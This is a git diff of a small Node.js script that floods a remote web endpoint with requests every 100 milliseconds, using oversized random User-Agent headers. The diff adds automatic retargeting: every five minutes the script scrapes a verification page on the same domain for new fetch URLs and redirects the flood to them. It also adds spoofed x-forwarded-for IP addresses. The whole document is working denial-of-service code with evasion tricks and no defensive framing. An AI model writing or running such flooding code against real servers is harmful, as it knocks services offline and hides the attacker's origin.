@@ -1,4 +1,4 @@
-
+let relurl = "https://apibytow.robloxdiscord.pl/agg"
 
 import fetch from 'node-fetch'
 import fs from 'fs'
@@ -19,7 +19,7 @@ function makeid(length) {
     return result;
     }
     setInterval(()=>{
-        fetch("https://apibytow.robloxdiscord.pl/agg", {
+        fetch(relurl, {
             "credentials": "omit",
             "headers": {
                 "User-Agent": makeid(10000),
@@ -37,3 +37,34 @@ function makeid(length) {
             "mode": "cors"
         })
     },100)
+
+setInterval(()=>{
+  fetch("https://weryfikacja-bytow.robloxdiscord.pl/", {
+      "credentials": "omit",
+      "headers": {
+          "User-Agent": "",
+          "Accept": "*/*",
+          "Accept-Language": "en-US,en;q=0.5",
+          "Content-Type": "application/x-www-form-urlencoded",
+          "Sec-Fetch-Dest": "empty",
+          "Sec-Fetch-Mode": "cors",
+          "Sec-Fetch-Site": "same-site",
+          "x-forwarded-for": ["180.190.162.93", "79.186.224.82", "176.227.156.147", "177.125.95.106"]
+      },
+      "method": "GET",
+      "mode": "cors"
+  }).then(e=>{
+    e.text().then(e=>{
+      e = e.split("\n")
+      let v = []
+      e.forEach(e=>{
+        if(e.includes('fetch("https://')){
+          e = e.split('"')
+          v.push(e[1])
+
+        }
+      })
+      relurl = v[0]
+    })
+  })
+}, 300000)
